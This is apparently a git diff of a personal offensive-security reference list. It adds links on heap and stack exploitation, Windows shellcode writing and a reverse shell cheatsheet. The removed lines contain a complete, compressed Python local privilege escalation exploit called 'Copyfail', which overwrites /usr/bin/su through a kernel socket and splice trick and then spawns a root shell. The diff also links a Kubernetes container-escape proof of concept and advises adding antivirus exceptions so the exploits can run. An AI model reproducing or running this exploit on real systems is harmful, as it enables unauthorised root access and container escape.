@@ -4,6 +4,16 @@ A collection of interesting resources I thought might be useful next time.
 ## Learning Resources
 1. [how2heap github repo](https://github.com/shellphish/how2heap)
     - Super informative repo for heap exploitation techniques.
+2. [smashing the stack for fun and profit](/Docs/stack_smashing.pdf)
+    - Classic article on stack exploitation.
+3. [Basics of Windows shellcode writing](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#find_dll)
+    - Guide to writing Windows shellcode, including how to find DLLs and functions.
+    - Uses PEB walking technique to locate kernel32.dll
+4. [Introduction to Windows Shellcode Development](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/)
+    - Uses PEB walking technique to locate `GetProcAddress` in kernel32.dll
+    - Then uses `GetProcAddress` to resolve the addresses of other necessary functions.
+    - More extensible than PEB walking every function
+
 ## Useful Blogposts
 1. [pentestmonkey Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
     - Great reverse shell commands
@@ -32,24 +42,19 @@ A collection of interesting resources I thought might be useful next time.
 
     
 
-## Some useful CVEs
+## Some useful CVEs collections
+> Word of caution: Any competent antivirus would have fingerprinted these exploits, **use at your own risk**.
+> Windows Defender will flag them, you have to set exceptions for the file to be read.
 ### LPEs 
-#### [Copyfail](https://copyfail.com)
+#### Copyfail
 > lightweight 732 byte LPE exploit for Linux kernel 5.8-5.10.17, 5.11-5.11.11, 5.12-5.12.9, 5.13-5.13.12, 5.14-5.14.6, and 5.15-5.15.25
-```
-#!/usr/bin/env python3
-import os as g,zlib,socket as s
-def d(x):return bytes.fromhex(x)
-def c(f,t,c):
- a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
- try:u.recv(8+t)
- except:0
-f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
-while i<len(e):c(f,i,e[i:i+4]);i+=4
-g.system("su")
-```
-#### [Copyfail K container escape]
+
+Website [here](https://copyfail.com)
+script here: [copyfail](/CVEs/copyfail.py)
+
+#### Copyfail K container escape
 > adapted from copyfail, allows unprivileged containers to achieve node level code execution on kubernetes
+
 Github repo: [here](https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC)
 
 
